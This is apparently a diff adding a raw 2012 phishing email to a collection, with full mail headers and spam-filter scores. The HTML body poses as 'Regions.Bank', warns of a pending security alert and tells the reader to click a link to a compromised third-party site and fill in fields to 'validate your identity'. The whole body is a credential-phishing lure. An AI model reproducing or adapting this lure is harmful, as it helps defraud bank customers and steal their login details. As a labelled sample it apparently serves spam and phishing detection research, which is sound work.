@@ -1,0 +1,87 @@
+Return-path: <security@security.com>
+Envelope-to: pa.youth.communications@pausatf.org
+Delivery-date: Thu, 19 Jan 2012 20:40:09 -0500
+Received: from eastrmfepo203.cox.net ([68.230.241.218])
+	by srv1.commondns.com with esmtp (Exim 4.69)
+	(envelope-from <security@security.com>)
+	id 1Ro3Sb-0002E4-KL
+	for pa.youth.communications@pausatf.org; Thu, 19 Jan 2012 20:40:09 -0500
+Received: from eastrmimpo306.cox.net ([68.230.241.238])
+          by eastrmfepo203.cox.net
+          (InterMail vM.8.01.04.00 201-2260-137-20101110) with ESMTP
+          id <20120120014003.DJRV25070.eastrmfepo203.cox.net@eastrmimpo306.cox.net>;
+          Thu, 19 Jan 2012 20:40:03 -0500
+Received: from User ([72.215.204.30])
+	by eastrmimpo306.cox.net with bizsmtp
+	id Pdfz1i00N0fsK8w02dfzUp; Thu, 19 Jan 2012 20:40:03 -0500
+X-CT-Class: Confirmed
+X-CT-Score: 6.00
+X-CT-RefID: str=0001.0A020204.4F18C3AF.0030,ss=4,sh,re=0.000,fgs=0
+X-CT-Spam: 1
+X-Authority-Analysis: v=1.1 cv=QFd1i8EmGWXMF/FLlwwalaY9IE87M3wXCJnHJtyYFmw=
+ c=1 sm=1 a=Dyoqhi_TatcA:10 a=YWNZQc2wkpcA:10 a=Cfj4BQAnxiAA:10
+ a=qqybi2Yv1R1FiPAKjuDS7w==:17 a=OTNTxTkJAAAA:8 a=nIN7YQ10AAAA:8
+ a=KHp3cZQlXvVgk9L-bTwA:9 a=lK_P4Mg5xsf_jh1nqVMA:7 a=Ft8UYL4EG9YA:10
+ a=qqybi2Yv1R1FiPAKjuDS7w==:117
+X-CM-Score: 0.00
+Authentication-Results: cox.net; none
+From: "RegionsNet"<security@security.com>
+Subject: Pending Alert Message!!!
+Date: Thu, 19 Jan 2012 18:34:19 -0700
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+Message-Id: <20120120014003.DJRV25070.eastrmfepo203.cox.net@eastrmimpo306.cox.net>
+
+<html>
+
+
+
+
+
+<title></title>
+
+</head>
+
+
+
+<body>
+
+
+
+<p><font face="Arial" size="2">At Regions.Bank we take customer security very 
+
+seriously. Please take a few moments to read your alert message.
+
+This is an important secure message, disregarding this message may affect your account status.<br>
+
+To read this alert message, please follow these steps:<br>
+
+1. <b>
+
+<a href="http://prosapia.net/uploads/media/.secure.regions.com/System/">
+
+Click here to go to our website &gt;&gt;</a></b><br>
+
+2. Fill in the appropriate fields to validate your identity.<br>
+
+<br>
+
+Thank you for using Regions.Bank.<br>
+
+<br>
+
+&nbsp;</font></p>
+
+
+
+</body>
+
+
+
+</html>
